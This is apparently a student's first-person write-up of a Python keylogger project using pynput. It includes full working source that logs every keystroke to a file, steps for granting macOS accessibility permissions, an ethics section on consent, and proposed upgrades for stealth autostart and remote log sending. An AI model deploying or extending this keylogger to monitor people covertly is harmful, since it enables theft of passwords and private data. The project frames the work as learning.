#KEYLOGGER PROJECT


##1. Project Overview

In this project, I created a keylogger, which is a program that records every keystroke a user makes on a keyboard. The keylogger runs in the background and saves the captured keystrokes to a file for future reference.
The project was built using Python and the pynput library, which allows the program to monitor and control input devices such as the keyboard and mouse.
Next steps will explain how to install the required tools, write the code, and run the keylogger.

##2. Setting Up the Environment

Before I started writing the keylogger, I had to set up my development environment. Here’s what I did:

	2.1. Installed Python:
	⁃	I had Python already installed on my machine. 

	2.2. Installed the pynput Library:
	⁃	To capture keyboard input, I needed the pynput library, which isn't included with Python by default.

	⁃	I installed pynput by opening the terminal and typing the following command:  python3 -m pip install pynput

	⁃	This installed the library, which I used to monitor keystrokes.



##3. Writing the Keylogger Code

Once the environment was set up, I started writing the keylogger. Here's a step-by-step breakdown of how I created the script:

	3.1. Imported Required Libraries:
	⁃	I imported the pynput library for monitoring keyboard input and the logging library to save the keystrokes to a file. I run the following command:
		  	from pynput.keyboard import Listener
          	import logging

	3.2. Set Up Logging:
	⁃	I configured the logging module to save the captured keystrokes in a file called keylog.txt. I also made sure that the file would include timestamps for each keystroke.
			logging.basicConfig(filename=("keylog.txt"), 
			level=logging.DEBUG, format='%(asctime)s: %(message)s')

	3.3. Defined a Function to Log Keystrokes:
	⁃	I created a function, on_press, that logs each key press. The function converts the key to a string and logs it into the file.
			def on_press(key):
    				try:
        				logging.info(str(key))
    				except:
        				Pass

	3.4. Set Up the Listener:
	⁃	I used pynput's Listener class to listen for keyboard events and trigger the on_press function every time a key was pressed. The listener ran continuously in the background.
			with Listener(on_press=on_press) as listener:
    				listener.join()

	3.5. Saved the Script:
	⁃	I saved the script as keylogger.py in my chosen directory.


##4. Running the Keylogger

After writing the keylogger script, I ran it to start capturing keystrokes. Here’s what I did:

	4.1. Opened Terminal or IDLE:
	⁃	I opened the terminal (or IDLE, if you prefer) and navigated to the directory where I saved the keylogger.py file using the cd command.

	⁃	For example, if the script was saved in the Documents folder, I typed: 
	cd /Users/myusername/Documents/

	4.2. Ran the Keylogger Script:
	⁃	Once I was in the correct directory, I ran the script by typing: 
		python3 keylogger.py

	⁃	This started the keylogger, which immediately began recording every keystroke I typed.
	
	4.3. Testing:
	⁃	While the keylogger was running, I opened a text editor or browser and typed some random text to test it. The keylogger was quietly running in the background, capturing each keystroke.
	
	4.4. Stopping the Keylogger:
	⁃	To stop the keylogger, I returned to the terminal window where the script was running and pressed Ctrl + C. This stopped the script and ended the logging process.


##5. Checking the Logged Keystrokes

Once I stopped the keylogger, I checked the file where all the keystrokes were logged to ensure everything was captured correctly. Here’s how I did it:

	5.1. Opened the Log File:
	⁃	After stopping the script, I navigated to the directory where I saved the keylog.txt file. This was the file where all the keystrokes had been recorded.

	⁃	I opened the file using a text editor like Notepad (on Windows) or TextEdit (on macOS). I could also open it from the terminal using:  		open keylog.txt

	5.2. Reviewing the Logged Keystrokes:
	⁃	Inside the keylog.txt file, I found a detailed list of every key I had pressed, along with timestamps for when each key was logged.

	⁃	The keys were labeled clearly, with special keys like Shift, Enter, and Backspace recorded by name (e.g., Key.enter, Key.space, etc.).

	5.3. Ensuring Accuracy:
	⁃	I verified that the file accurately recorded all my keystrokes during the period when the keylogger was running. Everything I typed, including spaces and special keys, was logged successfully.


##6. Granting Accessibility Permissions (For macOS)

When running the keylogger on macOS, I encountered a system security feature that blocks programs from monitoring keystrokes unless they are granted explicit permission. Here’s how I resolved that:

	6.1. Received a Warning Message:
	⁃	While running the keylogger, I saw a warning in the terminal or log file that said: "This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients."

	⁃	This meant that macOS was preventing the keylogger from capturing keystrokes.
	
	6.2. Opened System Preferences:
	⁃	I went to System Preferences by clicking the Apple logo in the top-left corner of my screen and selecting System Preferences.

	6.3. Navigated to Security & Privacy:
	⁃	In System Preferences, I selected Security & Privacy and then clicked on the Privacy tab.

	6.4. Granted Accessibility Permissions:
	⁃	In the Privacy tab, I selected Accessibility from the list on the left.

	⁃	I clicked the lock icon at the bottom-left corner of the window to unlock the settings (I had to enter my Mac password to do this).

	⁃	Then, I clicked the + button and added Python from the list of applications. This allowed my keylogger script to monitor keystrokes.

	6.5. Restarted the Keylogger:
	⁃	After granting permissions, I closed the System Preferences window and restarted my keylogger script.

	⁃	This time, the script was able to run without the warning message, and it successfully captured all keystrokes.


##7. Ethical Considerations

Building and running a keylogger comes with important ethical responsibilities. Here are some key points I considered when working on this project:

	7.1. Use for Educational Purposes:
	⁃	I built this keylogger strictly as an educational project to improve my programming skills and understand how monitoring tools work. This helped me learn about capturing inputs and handling logs in Python.
	
	7.2. Respecting Privacy:
	⁃	A keylogger can be a powerful tool, but it should never be used to spy on others without their permission. Recording someone’s keystrokes without their consent is illegal and unethical.

	⁃	If I ever plan to use this tool, I will ensure that I have the explicit consent of anyone whose keystrokes I intend to monitor. For example, using it for personal tracking on my own devices is acceptable.
	
	7.3. Legal Awareness:
	⁃	In many countries, using keyloggers without consent can violate privacy laws and result in serious legal consequences. I made sure to research the laws in my region and followed ethical guidelines to use this tool responsibly.

	7.4. Responsible Sharing:
	⁃	If I share the code or project with others, I will include a disclaimer emphasizing the ethical considerations and legal consequences of using keyloggers without permission. This ensures that others who work with the project understand the importance of using the tool responsibly.


##8. Future Improvements

After successfully building the basic keylogger, I thought of a few ways to improve and expand the project in the future:

	8.1. Adding Encryption:
	⁃	I could improve the security of the keylogger by encrypting the keystroke logs. This would ensure that if someone else gains access to the log file, they wouldn’t be able to read the captured data without decrypting it first.
	
	8.2. Stealth Mode:
	⁃	I could modify the script to make the keylogger run more discreetly by setting it up to start automatically when the computer boots, without opening a visible terminal or window. This would simulate how more advanced keyloggers operate.

	8.3. Remote Log Sending:
	⁃	Another improvement could be the addition of functionality to email or send the log file to a remote server, allowing the keylogger to send data without requiring manual access to the machine.

	8.4. Keyboard Event Filters:
	⁃	I could add filters to the keylogger so that it only logs certain keys (for example, logging only when certain applications are open or ignoring harmless keys like “Shift” or “Caps Lock”).

	8.5. User Interface:
	⁃	Developing a simple graphical user interface (GUI) would make it easier for others to use the keylogger without needing to interact with the command line.

	8.6. Timestamp Improvements:
	⁃	I could include more detailed timestamps that not only show the exact time of each keystroke but also track how long the user spent between each keypress, providing more insight into their typing patterns.



THE END.
